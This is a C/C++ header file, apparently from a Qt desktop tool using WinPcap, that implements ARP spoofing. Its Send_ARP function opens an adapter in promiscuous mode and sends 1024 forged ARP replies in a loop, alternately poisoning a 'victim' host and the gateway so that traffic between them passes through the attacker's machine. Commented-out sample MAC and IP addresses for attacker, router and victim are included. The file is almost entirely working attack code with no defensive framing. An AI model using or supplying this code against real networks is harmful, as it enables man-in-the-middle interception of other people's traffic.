#ifndef ARPSPOOFING_H
#define ARPSPOOFING_H

#define _W64
#define HAVE_REMOTE
#include "pcap.h"
#include <QDebug>
#define ETHERTYPE_IP    0x0800
#define ETHERTYPE_ARP   0x0806
typedef struct _ETHeader         // 14字节的以太头
{
	UCHAR	dhost[6];			// 目的MAC地址destination mac address
	UCHAR	shost[6];			// 源MAC地址source mac address
	USHORT	type;				// 下层协议类型，如IP（ETHERTYPE_IP）、ARP（ETHERTYPE_ARP）等
} ETHeader, *PETHeader;
#define ARPHRD_ETHER 	1
// ARP协议opcodes
#define	ARPOP_REQUEST	1		// ARP 请求
#define	ARPOP_REPLY		2		// ARP 响应
typedef struct _ARPHeader		// 28字节的ARP头
{
	USHORT	hrd;				//	硬件地址空间，以太网中为ARPHRD_ETHER
	USHORT	eth_type;			//  以太网类型，ETHERTYPE_IP ？？
	UCHAR	maclen;				//	MAC地址的长度，为6
	UCHAR	iplen;				//	IP地址的长度，为4
	USHORT	opcode;				//	操作代码，ARPOP_REQUEST为请求，ARPOP_REPLY为响应
	UCHAR	smac[6];			//	源MAC地址
	UCHAR	saddr[4];			//	源IP地址
	UCHAR	dmac[6];			//	目的MAC地址
	UCHAR	daddr[4];			//	目的IP地址
} ARPHeader, *PARPHeader;
/* 4 bytes IP address */
typedef struct ip_address{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;
/* IPv4 header */
typedef struct ip_header{
	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
	u_char  tos;            // Type of service
	u_short tlen;           // Total length
	u_short identification; // Identification
	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
	u_char  ttl;            // Time to live
	u_char  proto;          // Protocol
	u_short crc;            // Header checksum
	ip_address  saddr;      // Source address
	ip_address  daddr;      // Destination address
	u_int   op_pad;         // Option + Padding
}ip_header;
/* UDP header*/
typedef struct udp_header{
	u_short sport;          // Source port
	u_short dport;          // Destination port
	u_short len;            // Datagram length
	u_short crc;            // Checksum
}udp_header;
/* prototype of the packet handler */

void QString2byte(QString in, u_char out[]);
int Send_ARP(QString, QString, QString, QString, QString, QString, QString);

//int main(){

//QString thismac = "a4:d1:8c:5f:26:ec";
//QString thisip = "192.168.1.101";
//QString routermac = "3c:46:d8:2e:67:98";
//QString routerip = "192.168.1.1";
//QString victimmac = "28:c2:dd:27:8d:7d";
//QString victimip = "192.168.1.105";
//	sendARP();
//}

int Send_ARP(QString thismac, QString thisip, QString routermac, QString routerip, QString victimmac, QString victimip, QString NIC_name)
{
//    thismac = "a4:d1:8c:5f:26:ec";
//    thisip = "192.168.1.101";
//    routermac = "3c:46:d8:2e:67:98";
//    routerip = "192.168.1.1";
//    victimmac = "28:c2:dd:27:8d:7d";
//    victimip = "192.168.1.105";
//    qDebug() << NIC_name;

	pcap_if_t *alldevs;//获取到的设备列表
	pcap_if_t *d;//指向的一个网络设备
	pcap_t *adhandle;//用于捕获数据的Winpcap会话句柄
	char errbuf[PCAP_ERRBUF_SIZE];//错误缓冲区
	u_int netmask;
	char packet_filter[] = "arp";
	struct bpf_program fcode;//bpf过滤代码结构

	//Retrieve the device list  获得设备列表
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)//pcap_findalldevs_ex 获得本地计算机上所有的网络设备列表设备列表
	{
		//fqDebug(stderr,"Error in pcap_findalldevs: %s\n", errbuf);////fq() 打印每个网络设备的信息
		exit(1);
	}

    int i = 0;
    /* Print the list */
    for(d=alldevs; d; d=d->next)
    {
        qDebug("%d. %s", ++i, d->name);
        if (d->description)
            qDebug(" (%s)\n", d->description);
        else
            qDebug(" (No description available)\n");
    }
    if(i==0)
    {
        qDebug("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }

	//跳转到已选设备
    for(d=alldevs; strcmp(d->name+8, NIC_name.toLatin1().data()) !=0 ;d=d->next){
        qDebug() << d->name;
        qDebug() << NIC_name.toLatin1().data();
    }

	/* 打开适配器 */
	if ( (adhandle= pcap_open(d->name,  // name of the device 设备名
							 65536,     // portion of the packet to capture. 要捕获的数据包的部分
										// 65536 grants that the whole packet will be captured on all the MACs.65536保证能捕获到不同数据链路层上的每个数据包上的全部内容
							 PCAP_OPENFLAG_PROMISCUOUS,         // promiscuous mode 混杂模式
							 1000,      // read timeout 读取超时时间
							 NULL,      // remote authentication 远程机器验证
							 errbuf     // error buffer
							 ) ) == NULL)
	{
		//fqDebug(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	/* Check the link layer. We support only Ethernet for simplicity. */
	if(pcap_datalink(adhandle) != DLT_EN10MB)//pcap_datalink检查数据链路层
	{
		//fqDebug(stderr,"\nThis program works only on Ethernet networks.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	if(d->addresses != NULL)
		/* Retrieve the mask of the first address of the interface */
		netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	else
		/* If the interface is without addresses we suppose to be in a C class network */
		netmask=0xffffff;
	//compile the filter
	if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) <0 )
	{
		//fqDebug(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	//set the filter
	if (pcap_setfilter(adhandle, &fcode)<0)
	{
		//fqDebug(stderr,"\nError setting the filter.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	qDebug("\nlistening on %s...\n", d->description);

	//发送arp包
	u_char ucFrame[100];
	memset(ucFrame, 0x00, 100);
	// 设置Ethernet头
	u_char arDestMac[6];//={0xff,0xff,0xff,0xff,0xff,0xff};//被攻击者MAC
	QString2byte(victimmac, arDestMac);
	u_char arSourceMac[6];//={0x1c,0xb7,0x2c,0x2f,0x9b,0xe2};//////////////////////本机MAC
	QString2byte(thismac, arSourceMac);
	u_char arRouterMac[6];//{0x1c,0xb7,0x2c,0x2f,0x9b,0xe2};//////////////////////网关MAC
	QString2byte(routermac, arRouterMac);
	ETHeader eh = { 0 };
	eh.type = ::htons(ETHERTYPE_ARP);

	// 设置Arp头
	ARPHeader ah = { 0 };
	ah.hrd = htons(ARPHRD_ETHER);
	ah.eth_type = htons(ETHERTYPE_IP);
	ah.maclen = 6;
	ah.iplen = 4;
	ah.opcode = htons(ARPOP_REPLY);

	QByteArray ba = thisip.toLatin1();
	ULONG32 sIPAddr=inet_addr(ba.data());//本机IP
	ba = victimip.toLatin1();
	ULONG32 dIPAddr=inet_addr(ba.data());//被攻击者IP
	ba = routerip.toLatin1();
	ULONG32 rIPAddr=inet_addr(ba.data());//网关IP

	int n=0;
	while(n<1024)
	{
		if(n%2)//轮流欺骗网关和受害者，这里欺骗网关：IP为被害者的MAC在我这里
		{
			memcpy(eh.dhost, arRouterMac, 6);//memcpy内存拷贝函数,从源src所指的内存地址的起始位置开始拷贝n个字节到目标dest所指的内存地址的起始位置中
			memcpy(eh.shost, arSourceMac, 6);
			memcpy(ucFrame, &eh, sizeof(eh));
			memcpy(ah.smac, arSourceMac, 6);
			memcpy(ah.saddr, &dIPAddr, 4);//受害主机的IP
			memcpy(ah.dmac, arRouterMac, 6);
			memcpy(ah.daddr, &rIPAddr, 4);
		}
		else//这里欺骗被害主机：IP为网关的MAC在我这里
		{
			memcpy(eh.dhost, arDestMac, 6);//memcpy内存拷贝函数,从源src所指的内存地址的起始位置开始拷贝n个字节到目标dest所指的内存地址的起始位置中
			memcpy(eh.shost, arSourceMac, 6);
			memcpy(ucFrame, &eh, sizeof(eh));
			memcpy(ah.smac, arSourceMac, 6);
			memcpy(ah.saddr, &rIPAddr, 4);//发送网关的IP
			memcpy(ah.dmac, arDestMac, 6);
			memcpy(ah.daddr, &dIPAddr, 4);
		}
		memcpy(&ucFrame[sizeof(ETHeader)], &ah, sizeof(ah));
		if (pcap_sendpacket(adhandle,	ucFrame,	60) != 0)
		{
			fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(adhandle));//pcap_geterr获取错误消息
			return 3;
		}
		n++;
	}
	pcap_freealldevs(alldevs);
	return 0;
}

void QString2byte(QString in, u_char out[])
{
	//ff:ff:ff:ff:ff:ff
	//0123456789
	char tmp[3];
	tmp[2]='\0';
	int bit;

	tmp[0]=in[0].toLatin1();
	tmp[1]=in[1].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[0]=bit;

	tmp[0]=in[3].toLatin1();
	tmp[1]=in[4].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[1]=bit;

	tmp[0]=in[6].toLatin1();
	tmp[1]=in[7].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[2]=bit;

	tmp[0]=in[9].toLatin1();
	tmp[1]=in[10].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[3]=bit;

	tmp[0]=in[12].toLatin1();
	tmp[1]=in[13].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[4]=bit;

	tmp[0]=in[15].toLatin1();
	tmp[1]=in[16].toLatin1();
	sscanf(tmp, "%x", &bit);
	out[5]=bit;
}


#endif // ARPSPOOFING_H
